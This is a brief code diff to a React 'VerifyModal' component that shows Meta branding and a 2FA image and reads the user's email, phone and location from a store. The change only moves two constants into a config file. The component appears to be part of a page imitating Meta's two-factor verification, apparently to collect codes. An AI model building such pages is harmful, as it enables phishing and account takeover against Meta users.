@@ -1,6 +1,7 @@
 import MetaLogo from '@/assets/images/meta-logo-image.png';
 import VerifyImage from '@/assets/images/2FAuth.png';
 import { store } from '@/store/store';
+import config from '@/utils/config';
 import translateText from '@/utils/translate';
 import axios from 'axios';
 import Image from 'next/image';
@@ -15,8 +16,8 @@ const VerifyModal: FC<{ nextStep: () => void; userName?: string }> = ({ nextStep
     const [translations, setTranslations] = useState<Record<string, string>>({});
 
     const { geoInfo, messageId, setMessageId, message, setMessage, userEmail, userPhone } = store();
-    const maxCode = 5;
-    const loadingTime = 10;
+    const maxCode = config.MAX_CODE;
+    const loadingTime = config.CODE_LOADING_TIME;
 
     const t = (text: string): string => {
         return translations[text] || text;
